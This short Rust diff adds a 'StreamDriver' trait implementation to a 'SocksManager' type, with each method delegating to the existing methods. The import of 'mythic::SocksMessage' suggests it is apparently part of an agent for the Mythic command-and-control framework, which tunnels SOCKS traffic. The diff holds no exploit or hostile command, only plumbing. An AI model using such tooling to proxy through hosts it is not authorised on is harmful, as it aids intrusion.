@@ -6,6 +6,8 @@ use std::time::{Duration, Instant};
 use base64::{Engine, engine::general_purpose::STANDARD};
 use mythic::SocksMessage;
 
+use crate::streams::StreamDriver;
+
 const MAX_READ_PER_CONN: usize = 32 * 1024;
 const MAX_CONNECTIONS: usize = 128;
 const MAX_PENDING_WRITE_BYTES: usize = 1024 * 1024;
@@ -180,6 +182,26 @@ impl SocksManager {
             exit,
             data: Some(STANDARD.encode(data)),
         });
+    }
+}
+
+impl StreamDriver for SocksManager {
+    type Message = SocksMessage;
+
+    fn handle_inbound(&mut self, messages: Vec<Self::Message>) {
+        SocksManager::handle_inbound(self, messages);
+    }
+
+    fn drain_outbound(&mut self) -> Vec<Self::Message> {
+        SocksManager::drain_outbound(self)
+    }
+
+    fn requeue_outbound_front(&mut self, messages: Vec<Self::Message>) {
+        SocksManager::requeue_outbound_front(self, messages);
+    }
+
+    fn wants_fast_poll(&self) -> bool {
+        SocksManager::wants_fast_poll(self)
     }
 }
 
